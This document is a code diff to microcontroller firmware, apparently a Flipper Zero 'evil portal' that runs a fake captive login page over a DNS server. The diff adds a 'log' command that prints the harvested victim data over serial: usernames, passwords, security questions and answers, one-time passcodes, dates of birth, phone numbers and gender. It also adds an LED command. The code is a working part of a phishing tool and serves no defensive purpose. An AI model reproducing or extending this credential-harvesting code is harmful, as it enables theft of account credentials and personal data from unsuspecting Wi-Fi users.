@@ -19,6 +19,8 @@
 #define START_CMD "start"
 #define ACK_CMD "ack"
 #define STOP_CMD "stop"
+#define LOG_CMD "log"
+#define LED_CMD "led="
 
 // GLOBALS
 DNSServer dnsServer;
@@ -353,5 +355,44 @@ void loop()
   {
     Serial.println("stopping server");
     stopServer();
+  }
+  if (checkForCommand(LOG_CMD))
+  {
+    Serial.println("sending logs");
+    // Send logs to Flipper Zero
+    Serial.println("---------------------------------------");
+    Serial.println("Username: " + user_name);
+    Serial.println("Password: " + password);
+    if (!first_name.isEmpty()) {
+      Serial.println("first name: " + first_name);
+    }
+    if (!last_name.isEmpty()) {
+      Serial.println("last name: " + last_name);
+    }
+    if (!secret_question.isEmpty()) {
+      Serial.println("Secret Q: " + secret_question);
+    }
+    if (!secret_answer.isEmpty()) {
+      Serial.println("Secret A: " + secret_answer);
+    }
+    if (!otp.isEmpty()) {
+      Serial.println("OTP: " + otp);
+    }
+    if (!dob.isEmpty()) {
+      Serial.println("DOB: " + dob);
+    }
+    if (!mobile_number.isEmpty()) {
+      Serial.println("Mobile No: " + mobile_number);
+    }
+    if (!gender.isEmpty()) {
+      Serial.println("Gender: " + gender);
+    }
+    Serial.println("---------------------------------------");
+  }
+  if (checkForCommand(LED_CMD))
+  {
+    Serial.println("setting LED");
+    // Example: Set LED to GOOD
+    setLed(GOOD);
   }
 }
